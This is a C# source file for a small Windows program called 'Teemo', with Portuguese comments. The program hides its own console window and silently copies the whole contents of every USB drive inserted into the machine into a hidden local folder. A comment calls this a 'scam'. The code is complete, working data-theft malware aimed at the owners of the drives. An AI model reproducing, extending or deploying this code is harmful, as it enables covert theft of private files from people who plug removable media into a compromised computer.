using System;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;

//By: Leo
namespace Teemo
{
    class Program
    {
        //public DirectoryInfo RootDirectory { get; }
        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();

        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        const int SwHide = 0;
        //const int SwShow = 5;

        static void Main(/*string[] args*/)
        {
            //Inicia a falcatrua
            Iniciar();

            /*Console.WriteLine("Digite a sua senha");
            Console.ReadLine();
            Console.WriteLine("Obrigado... (Precione qualquer tecla)");
            Console.ReadKey();*/

            //Cria o diretório Teemo, e abre ele
            //CaDir(Environment.CurrentDirectory + @"\DTeemo");
            
            //Esconde
            Esconder();
        }

        private static void Iniciar()
        {
            //Lê os drives
            var driveInfo = DriveInfo.GetDrives();

            //Variavel para listar drives removíveis
            var pendrives = driveInfo.Where(d => d.IsReady && d.DriveType == DriveType.Removable);
            

            foreach (var flashDrives in pendrives)
            {
                /*Console.WriteLine("Drive: {0}. Tipo: {1}. Tamanho {2}", _FlashDrives.Name, _FlashDrives.DriveType,_FlashDrives.TotalSize);
                Console.ReadKey();*/

                if (flashDrives.RootDirectory.ToString() != Path.GetPathRoot(Environment.CurrentDirectory))
                {
                    string salvar = Environment.CurrentDirectory + "\\Copia\\" + Guid.NewGuid();
                    /*Console.WriteLine("O arquivo será copiado de: {0}", _FlashDrives.RootDirectory.ToString());
                    //Console.WriteLine("Para: {0}", _salvar);
                    //Console.ReadKey();
                    Console.WriteLine("Copiando...");*/
                    DirectoryCopy(flashDrives.RootDirectory.ToString(), salvar, true);
                    //Console.WriteLine("Concluido");
                    Console.Beep();
                    //Console.ReadKey();
                }
            }
        }
        private static void DirectoryCopy(string sourceDirName, string destDirName, bool copySubDirs)
        {

            // Obtém os subdiretórios para o diretório especificado.
            DirectoryInfo dir = new DirectoryInfo(sourceDirName);

            //Verifica se não é a porcaria do System Volume Information
            if (sourceDirName.EndsWith("System Volume Information")) return;

            if (!dir.Exists)
            {
                throw new DirectoryNotFoundException(
                    "Diretorio fonte não existe, ou não foi encontrado: "
                    + sourceDirName);
            }

            DirectoryInfo[] dirs = dir.GetDirectories();

            // Se o diretório de destino não existir, crie-o.
            if (!Directory.Exists(destDirName))
            {
                Directory.CreateDirectory(destDirName);
            }

            // Obtenha os arquivos no diretório e copie-os para o novo local.
            FileInfo[] files = dir.GetFiles();
            foreach (FileInfo file in files)
            {
                string temppath = Path.Combine(destDirName, file.Name);
                file.CopyTo(temppath, true);
            }

            // Se copiar subdirectórios, copie-os e seu conteúdo para uma nova localização.
            if (copySubDirs)
            {
                foreach (DirectoryInfo subdir in dirs)
                {
                    string temppath = Path.Combine(destDirName, subdir.Name);
                    DirectoryCopy(subdir.FullName, temppath, true);
                }
            }
        }

        private static void CaDir(string dir)
        {
            if (!Directory.Exists(dir))
            {
                Directory.CreateDirectory(dir);
                Process.Start(dir);
            }
            else
            {
                Process.Start(dir);
            }
        }

        private static void Esconder()
        {   
            //Lê a janela
            var handle = GetConsoleWindow();
            //Esconde
            ShowWindow(handle, SwHide);
        }
    }
}

